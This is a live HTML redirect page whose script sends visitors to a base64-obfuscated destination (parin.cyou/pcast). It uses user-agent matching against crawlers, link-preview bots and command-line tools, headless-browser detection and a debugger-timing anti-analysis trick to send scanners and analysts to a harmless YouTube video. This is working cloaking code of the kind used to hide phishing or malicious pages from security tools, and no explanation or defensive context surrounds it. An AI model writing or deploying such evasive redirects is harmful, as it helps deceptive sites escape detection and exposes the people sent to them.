<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="2; url=https://parin.cyou/pcast">
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .logo-container {
            text-align: center;
            opacity: 0;
            animation: fadeInOut 2s ease-in-out;
        }
        .logo-container img {
            max-width: 200px;
            height: auto;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtZFoZ09Lq1LkROpjM2kJvnR3unVdWA8Aa7A&s" alt="Logo">
    </div>
    <script type="text/javascript">
        (function() {
            const encodedRealUrl = 'aHR0cHM6Ly9wYXJpbi5jeW91L3BjYXN0';
            const botUrl = 'https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb';
            let isBot = false;
            
            // 1. User-Agent check
            const ua = navigator.userAgent.toLowerCase();
            const obviousBots = [
                'curl', 'wget', 'fetch', 'httpie',
                'bot', 'spider', 'crawler', 'slurp',
                'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
                'twitterbot', 'facebookexternalhit', 'linkedinbot',
                'googlebot', 'bingbot', 'yandexbot', 'duckduckbot'
            ];
            if (obviousBots.some(bot => ua.includes(bot))) {
                isBot = true;
            }
            
            // 2. Headless detection
            if (
                navigator.webdriver === true ||
                (navigator.webdriver === undefined && ua.includes('headless'))
            ) {
                isBot = true;
            }
            
            // 3. Anti-debug
            try {
                const start = performance.now();
                debugger;
                if (performance.now() - start > 100) {
                    isBot = true;
                }
            } catch(e) {}
            
            // Redirect after animation
            setTimeout(function() {
                if (isBot) {
                    window.location.href = botUrl;
                } else {
                    window.location.href = atob(encodedRealUrl);
                }
            }, 2000);
        })();
    </script>
</body>
</html>
